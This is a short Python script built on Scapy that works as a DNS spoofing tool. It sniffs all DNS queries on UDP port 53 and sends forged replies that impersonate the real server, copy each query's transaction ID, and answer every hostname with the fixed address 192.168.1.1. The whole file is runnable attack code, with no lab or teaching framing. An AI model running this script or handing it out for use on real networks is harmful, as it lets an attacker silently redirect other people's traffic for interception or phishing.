from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sniff, send


def on_dns_packet_detected(pkt):
    if not pkt.haslayer(DNS) or not pkt[DNS].qr == 0:
        return

    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
    dns = DNS()

    response = ip / udp / dns

    response[DNS].id = pkt[DNS].id
    response[DNS].qr = 1
    response[DNS].qd = pkt[DNS].qd
    response[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.1.1")

    send(response)


if __name__ == '__main__':
    sniff(filter="udp and port 53", prn=on_dns_packet_detected)
